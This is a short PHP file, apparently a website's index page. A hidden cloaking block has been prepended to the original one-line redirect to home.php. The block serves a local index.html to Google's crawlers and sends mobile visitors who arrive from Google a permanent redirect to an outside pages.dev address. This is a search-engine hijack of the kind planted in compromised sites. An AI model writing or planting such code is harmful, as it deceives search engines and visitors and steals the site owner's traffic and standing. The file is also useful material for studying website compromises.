<?php
$amp_url = "https://amp-baku-stikespantikosala.pages.dev/"; 
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? ''; 
$referer = $_SERVER['HTTP_REFERER'] ?? ''; 
$is_from_google = !empty($referer) && preg_match("/google\.(com|co\.id)$/i", parse_url($referer, PHP_URL_HOST));
$is_mobile = preg_match("/(iPhone|Android|iPad|iPod|Mobile|BlackBerry|Windows Phone)/i", $user_agent);
$is_googlebot = preg_match("/(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher)/i", $user_agent);

if ($is_googlebot) {
    header("Content-Type: text/html");
    if (file_exists("index.html")) {
        readfile("index.html");
    } else {
        echo "File index.html tidak ditemukan.";
    }
    exit;
}

if ($is_from_google && $is_mobile) {
    header("Location: $amp_url", true, 301);
    exit;
}
?><?php

  header('location:home.php'); 

?>
